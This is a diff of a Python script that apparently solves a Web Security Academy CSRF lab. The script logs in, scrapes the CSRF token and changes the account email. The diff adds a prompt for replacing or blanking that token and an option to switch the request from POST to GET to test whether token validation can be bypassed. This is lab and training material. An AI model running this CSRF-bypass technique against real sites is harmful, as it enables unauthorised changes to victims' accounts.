@@ -8,14 +8,14 @@ import inquirer
 from http import HTTPStatus
 
 console = Console()
-EXPLOIT_SERVER="https://exploit-0a63001d03a1d344c03fbf8d01150077.exploit-server.net"
-SERVER="https://0a4100f603fcd3b1c0e0bd4300ad00bf.web-security-academy.net"
+SERVER="https://0aa3002303f99124c1d7f47f005e00b0.web-security-academy.net"
+EXPLOIT_SERVER="https://exploit-0a1a007c03cd9144c100f33d01c900d1.exploit-server.net"
 
 
 
 def login(session, server):
     response = session.get(f"{server}/login")
-    console.log(f"GET login status code {response.status_code}\n")
+    console.log(f"\nGET login status code {response.status_code}\n")
     html_document = html.fromstring(response.content)
     csrf_token = html_document.xpath("//input[@name = 'csrf']/@value")[0]
     response = session.post(f"{server}/login", data={
@@ -29,16 +29,21 @@ def update_email(session, server, exploit_server):
     response = session.get(f"{server}/my-account")
     console.log(f"GET my-account status code {response.status_code}\n")
     html_document = html.fromstring(response.content)
+    email = "ciccio@pasticcio.it"
     csrf_token = html_document.xpath("//input[@name = 'csrf']/@value")[0]
+
+    csrf_token=input('Insert new CSRF for the POST request (if you want to leave the field blank PRESS ENTER): ')
+
     response = session.post(f"{server}/my-account/change-email", data={
-        "email": "ciccio@paticcio.it",
+        "email": email,
         "csrf": csrf_token,
     })
-    console.log(f"POST change-email status code {response.status_code}\n")
+
+    console.log(f"\nPOST change-email status code {response.status_code}\n")
 
     confirm = {
     inquirer.Confirm('confirmed',
-                     message="Change methond from POST to GET?" ,
+                     message="Change method from POST to GET?" ,
                      default=False),
     }
     confirmation = inquirer.prompt(confirm)
